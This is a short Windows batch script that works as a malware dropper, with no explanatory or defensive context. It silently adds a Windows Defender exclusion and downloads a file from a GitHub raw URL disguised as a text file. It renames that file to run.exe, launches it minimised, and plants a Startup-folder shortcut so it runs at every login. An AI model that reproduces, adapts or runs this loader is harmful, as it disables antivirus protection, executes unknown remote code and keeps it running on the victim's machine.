@echo off
set folder=C:\Users\%USERNAME%\Public
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%folder%'"
set download_url=https://github.com/PXTDEV9022/tiendev/raw/refs/heads/main/python.txt
set download_location=C:\Users\%USERNAME%\Documents\document.txt
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '%download_location%'"
rename "%download_location%" "run.exe"
start /min "" "C:\Users\%USERNAME%\Documents\run.exe"
set shortcut_path=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk
powershell -WindowStyle Hidden -Command "$WScript = New-Object -ComObject WScript.Shell; $Shortcut = $WScript.CreateShortcut('%shortcut_path%'); $Shortcut.TargetPath = 'C:\Users\%USERNAME%\Documents\run.exe'; $Shortcut.Save()"
exit
